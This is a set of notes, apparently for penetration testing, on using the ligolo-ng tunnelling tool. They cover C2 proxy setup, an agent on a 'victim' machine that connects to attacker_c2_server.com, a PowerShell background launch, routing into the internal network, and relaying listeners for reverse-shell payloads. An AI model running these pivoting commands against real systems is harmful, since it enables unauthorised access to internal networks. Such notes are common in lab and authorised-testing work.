> How to https://4pfsec.com/ligolo

When using Linux, you need to create a tun interface on the Proxy Server (C2):

```shell
$ sudo ip tuntap add user [your_username] mode tun ligolo
$ sudo ip link set ligolo up
```
Start the _proxy_ server on your Command and Control (C2) server (default port 11601):

```shell
$ ./proxy -h # Help options
$ ./proxy -selfcert #use -autocert to Automatically request LetsEncrypt certificates
```
Start the _agent_ on your target (victim) computer (no privileges are required!):

```shell
$ ./agent -connect attacker_c2_server.com:11601 -ignore-cert
```

### in windows
```
$scriptBlock = { Start-Process ./agent.exe -ArgumentList @('-connect  192.168.45.193:11601', '-ignore-cert') }
Start-Job -ScriptBlock $scriptBlock
```
Use the `session` command to select the _agent_.

```
ligolo-ng » session 
? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
```
Add a route on the _proxy/relay_ server to the _192.168.0.0/24_ _agent_ network.

_Linux_:

```shell
$ sudo ip route add 192.168.0.0/24 dev ligolo
```

_Windows_:

```
> netsh int ipv4 show interfaces

Idx     Mét         MTU          État                Nom
---  ----------  ----------  ------------  ---------------------------
 25           5       65535  connected     ligolo
   
> route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
```

Start the tunnel on the proxy:

```
[Agent : nchatelain@nworkstation] » start
[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
```

### [Agent Binding/Listening](https://github.com/nicocha30/ligolo-ng#agent-bindinglistening)

You can listen to ports on the _agent_ and _redirect_ connections to your control/proxy server.

In a ligolo session, use the `listener_add` command.

The following example will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server.

```
[Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
INFO[1208] Listener created on remote agent!            
```

On the `proxy`:

```shell
$ nc -lvp 4321
```

When a connection is made on the TCP port `1234` of the agent, `nc` will receive the connection.

This is very useful when using reverse tcp/udp payloads.

You can view currently running listeners using the `listener_list` command and stop them using the `listener_stop [ID]` command:

```
[Agent : nchatelain@nworkstation] » listener_list 
┌───────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                              │
├───┬─────────────────────────┬────────────────────────┬────────────────────────┤
│ # │ AGENT                   │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼─────────────────────────┼────────────────────────┼────────────────────────┤
│ 0 │ nchatelain@nworkstation │ 0.0.0.0:1234           │ 127.0.0.1:4321         │
└───┴─────────────────────────┴────────────────────────┴────────────────────────┘

[Agent : nchatelain@nworkstation] » listener_stop 0
INFO[1505] Listener closed.                             
```
